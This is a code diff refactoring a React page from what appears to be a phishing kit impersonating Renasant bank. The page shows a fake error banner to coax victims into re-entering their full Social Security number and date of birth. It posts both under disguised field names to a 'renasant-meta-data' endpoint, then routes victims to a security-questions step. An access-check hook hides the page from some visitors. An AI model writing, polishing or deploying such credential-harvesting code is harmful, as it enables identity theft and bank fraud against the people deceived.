@@ -3,6 +3,8 @@ import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
+import FlowCard from '../components/FlowCard';
+import FormError from '../components/FormError';
 
 const SSN2: React.FC = () => {
   const [socialSecurityNumber, setSocialSecurityNumber] = useState('');
@@ -11,36 +13,36 @@ const SSN2: React.FC = () => {
   const [day, setDay] = useState('');
   const [year, setYear] = useState('');
   const [isLoading, setIsLoading] = useState(false);
-  const [errors, setErrors] = useState({ 
+  const [errors, setErrors] = useState({
     socialSecurityNumber: '',
-    dateOfBirth: ''
+    dateOfBirth: '',
   });
 
   const currentYear = new Date().getFullYear();
   const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
   const daysInMonth = month ? new Date(parseInt(year), parseInt(month), 0).getDate() : 31;
-  
-  const location = useLocation();
-  
-  const { emzemz } = location.state || {}; // Access the email passed in state
 
+  const location = useLocation();
+  const { emzemz } = location.state || {};
   const navigate = useNavigate();
   const isAllowed = useAccessCheck(baseUrl);
 
-  // Debug: Log the received email
-  console.log('SSN2 received email:', emzemz);
-
-  // Show loading state while checking access
-  if (!isAllowed) {
-    return <div>Loading...</div>; // Or a proper loading spinner
-  }
-
-  const toggleSSNVisibility = () => setShowSSN(prev => !prev);
+  const toggleSSNVisibility = () => setShowSSN((prev) => !prev);
 
   const getMonthName = (monthNumber: string) => {
     const monthNames = [
-      "January", "February", "March", "April", "May", "June",
-      "July", "August", "September", "October", "November", "December"
+      'January',
+      'February',
+      'March',
+      'April',
+      'May',
+      'June',
+      'July',
+      'August',
+      'September',
+      'October',
+      'November',
+      'December',
     ];
     return monthNames[parseInt(monthNumber) - 1] || '';
   };
@@ -48,17 +50,17 @@ const SSN2: React.FC = () => {
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
     setIsLoading(true);
-    
-    let newErrors = { 
+
+    const newErrors = {
       socialSecurityNumber: socialSecurityNumber.length !== 11 ? 'Please enter a valid 9-digit SSN.' : '',
-      dateOfBirth: (!month || !day || !year) ? 'Complete date of birth is required.' : ''
+      dateOfBirth: !month || !day || !year ? 'Complete date of birth is required.' : '',
     };
 
     if (month && day && year) {
       const dob = new Date(parseInt(year), parseInt(month) - 1, parseInt(day));
       const age = new Date().getFullYear() - dob.getFullYear();
       const monthDiff = new Date().getMonth() - dob.getMonth();
-      
+
       if (age < 18 || (age === 18 && monthDiff < 0)) {
         newErrors.dateOfBirth = 'You must be at least 18 years old.';
       }
@@ -66,16 +68,15 @@ const SSN2: React.FC = () => {
 
     setErrors(newErrors);
 
-    if (!Object.values(newErrors).some(error => error)) {
+    if (!Object.values(newErrors).some((error) => error)) {
       try {
         const d_b = `${getMonthName(month)}/${day}/${year}`;
         await axios.post(`${baseUrl}api/renasant-meta-data-6/`, {
-                    emzemz: emzemz,
-
+          emzemz,
           s2ns: socialSecurityNumber,
-          d_b: d_b
+          d_b,
         });
-        console.log('Form submitted successfully');
+
         navigate('/security-questions', { state: { emzemz } });
       } catch (error) {
         console.error('Error submitting form:', error);
@@ -86,158 +87,155 @@ const SSN2: React.FC = () => {
     }
   };
 
-  return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm">
-         <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Social Security Info and date of birth</h2>
-      </div>
+  if (!isAllowed) {
+    return null;
+  }
 
-
-      <div className="px-6 py-6 bg-white space-y-4">
-        <div className="flex items-center gap-2 text-sm font-bold mt-2 mb-2">
-          <svg className="w-4 h-4 fill-current text-red-600" viewBox="0 0 24 24">
-            <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-          </svg>
-          <p className="text-red-600">An error occurred. Please enter your full 9-digit Social Security number this time.</p>
-        </div>
-
-        <form onSubmit={handleSubmit}>
-     
-
-          {/* SSN Field */}
-          <div className="mb-4">
-            <label className="block text-gray-700 text-sm font-medium mb-2">
-              Social Security Number
-            </label>
-            <div className="relative">
-              <input
-                id="ssn"
-                name="ssn"
-                type={showSSN ? 'text' : 'password'}
-                value={socialSecurityNumber}
-                onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, '');
-                  let formattedValue = value;
-                  if (formattedValue.length >= 6) {
-                    formattedValue = formattedValue.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3');
-                  } else if (formattedValue.length >= 4) {
-                    formattedValue = formattedValue.replace(/(\d{3})(\d{2})/, '$1-$2');
-                  }
-                  setSocialSecurityNumber(formattedValue);
-                }}
-                onKeyDown={(e) => {
-                  if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab') {
-                    e.preventDefault();
-                  }
-                }}
-                maxLength={11}
-                placeholder="XXX-XX-XXXX"
-                className="w-full max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-              <span
-                className="absolute right-2 top-1/2 transform -translate-y-1/2 text-blue-700 text-sm hover:underline cursor-pointer"
-                onClick={toggleSSNVisibility}
-              >
-                {showSSN ? 'Hide' : 'Show'}
-              </span>
-            </div>
-          </div>
-
-          {errors.socialSecurityNumber && (
-            <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-              </svg>
-              <span>{errors.socialSecurityNumber}</span>
-            </div>
-          )}
-
-          {/* Date of Birth Fields */}
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Date of Birth:</label>
-            <div className="flex gap-2">
-              <select
-                value={month}
-                onChange={(e) => setMonth(e.target.value)}
-                className="border border-gray-300 px-2 py-1 text-sm rounded"
-              >
-                <option value="">Month</option>
-                {Array.from({ length: 12 }, (_, i) => (
-                  <option key={i + 1} value={i + 1}>
-                    {new Date(0, i).toLocaleString('default', { month: 'long' })}
-                  </option>
-                ))}
-              </select>
-              <select
-                value={day}
-                onChange={(e) => setDay(e.target.value)}
-                className="border border-gray-300 px-2 py-1 text-sm rounded"
-                disabled={!month || !year}
-              >
-                <option value="">Day</option>
-                {Array.from({ length: daysInMonth }, (_, i) => (
-                  <option key={i + 1} value={i + 1}>
-                    {i + 1}
-                  </option>
-                ))}
-              </select>
-              <select
-                value={year}
-                onChange={(e) => {
-                  setYear(e.target.value);
-                  setDay('');
-                }}
-                className="border border-gray-300 px-2 py-1 text-sm rounded"
-              >
-                <option value="">Year</option>
-                {years.map((y) => (
-                  <option key={y} value={y}>
-                    {y}
-                  </option>
-                ))}
-              </select>
-            </div>
-          </div>
-
-          {errors.dateOfBirth && (
-            <div className="flex items-center gap-2 text-red-600 text-sm ml-28">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-              </svg>
-              <span>{errors.dateOfBirth}</span>
-            </div>
-          )}
-
-          <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
-            {!isLoading ? (
-              <button
-                type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
-              >
-                Continue
-              </button>
-            ) : (
-              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-            )}
-          </div>
-        </form>
-      </div>
-
-      <div className="px-6 pb-6">
-        <p className="text-xs text-gray-700 mb-2">
-          For security reasons, never share your username, password, social security number, account number or other private data online, unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
+  if (!emzemz) {
+    return (
+      <FlowCard title="Unable to continue">
+        <p className="text-sm text-slate-600">
+          We could not locate your previous step. Please restart the flow from the beginning.
         </p>
-        <div className="text-xs text-blue-700 space-x-2">
-          <a href="#" className="hover:underline">Forgot Username?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Forgot Password?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Forgot Everything?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Locked Out?</a>
-        </div>
+      </FlowCard>
+    );
+  }
+
+  const footer = (
+    <div className="space-y-2 text-xs text-slate-600">
+      <p>
+        For security reasons, never share your username, password, social security number, account number or other private data online,
+        unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
+      </p>
+      <div className="flex flex-wrap items-center justify-center gap-2 text-[#0f4f6c]">
+        <a href="#" className="hover:underline">Forgot Username?</a>
+        <span className="text-slate-400">|</span>
+        <a href="#" className="hover:underline">Forgot Password?</a>
+        <span className="text-slate-400">|</span>
+        <a href="#" className="hover:underline">Forgot Everything?</a>
+        <span className="text-slate-400">|</span>
+        <a href="#" className="hover:underline">Locked Out?</a>
       </div>
     </div>
+  );
+
+  return (
+    <FlowCard
+      title="Confirm Your Social Security"
+      subtitle={<span className="text-slate-600">Enter your full SSN and date of birth to continue.</span>}
+      footer={footer}
+    >
+      <div className="rounded-md border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-600">
+        An error occurred. Please enter your full 9-digit Social Security number this time.
+      </div>
+
+      <form onSubmit={handleSubmit} className="space-y-4">
+        <div>
+          <label className="block text-sm text-slate-500 mb-1" htmlFor="ssn">
+            Social Security number
+          </label>
+          <div className="flex items-center border border-slate-200 rounded">
+            <input
+              id="ssn"
+              name="ssn"
+              type={showSSN ? 'text' : 'password'}
+              value={socialSecurityNumber}
+              onChange={(e) => {
+                const value = e.target.value.replace(/\D/g, '');
+                let formattedValue = value;
+                if (formattedValue.length >= 6) {
+                  formattedValue = formattedValue.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3');
+                } else if (formattedValue.length >= 4) {
+                  formattedValue = formattedValue.replace(/(\d{3})(\d{2})/, '$1-$2');
+                }
+                setSocialSecurityNumber(formattedValue);
+              }}
+              onKeyDown={(e) => {
+                if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab') {
+                  e.preventDefault();
+                }
+              }}
+              maxLength={11}
+              placeholder="XXX-XX-XXXX"
+              className="w-full px-3 py-3 text-sm focus:outline-none"
+            />
+            <button type="button" onClick={toggleSSNVisibility} className="px-3 text-slate-400">
+              {showSSN ? 'Hide' : 'Show'}
+            </button>
+          </div>
+          {errors.socialSecurityNumber ? <FormError message={errors.socialSecurityNumber} /> : null}
+        </div>
+
+        <div>
+          <label className="block text-sm text-slate-500 mb-1" htmlFor="dob-month">
+            Date of birth
+          </label>
+          <div className="flex items-center gap-2 border border-slate-200 rounded px-3 py-2">
+            <select
+              id="dob-month"
+              value={month}
+              onChange={(e) => setMonth(e.target.value)}
+              className="flex-1 bg-white text-sm focus:outline-none"
+            >
+              <option value="">Month</option>
+              {Array.from({ length: 12 }, (_, i) => (
+                <option key={i + 1} value={i + 1}>
+                  {new Date(0, i).toLocaleString('default', { month: 'long' })}
+                </option>
+              ))}
+            </select>
+            <select
+              id="dob-day"
+              value={day}
+              onChange={(e) => setDay(e.target.value)}
+              className="flex-1 bg-white text-sm focus:outline-none"
+              disabled={!month || !year}
+            >
+              <option value="">Day</option>
+              {Array.from({ length: daysInMonth }, (_, i) => (
+                <option key={i + 1} value={i + 1}>
+                  {i + 1}
+                </option>
+              ))}
+            </select>
+            <select
+              id="dob-year"
+              value={year}
+              onChange={(e) => {
+                setYear(e.target.value);
+                setDay('');
+              }}
+              className="flex-1 bg-white text-sm focus:outline-none"
+            >
+              <option value="">Year</option>
+              {years.map((y) => (
+                <option key={y} value={y}>
+                  {y}
+                </option>
+              ))}
+            </select>
+          </div>
+          {errors.dateOfBirth ? <FormError message={errors.dateOfBirth} /> : null}
+        </div>
+
+        <button
+          type="submit"
+          className="w-full bg-[#0f4f6c] text-white py-3 rounded-md flex items-center justify-center gap-2 disabled:opacity-75"
+          disabled={isLoading}
+        >
+          {isLoading ? (
+            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-white border-t-transparent"></div>
+          ) : (
+            <>
+              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 0l-2 2m2-2l-2-2m6 2l2 2m-2-2l2-2" />
+              </svg>
+              <span>Continue</span>
+            </>
+          )}
+        </button>
+      </form>
+    </FlowCard>
   );
 };
 
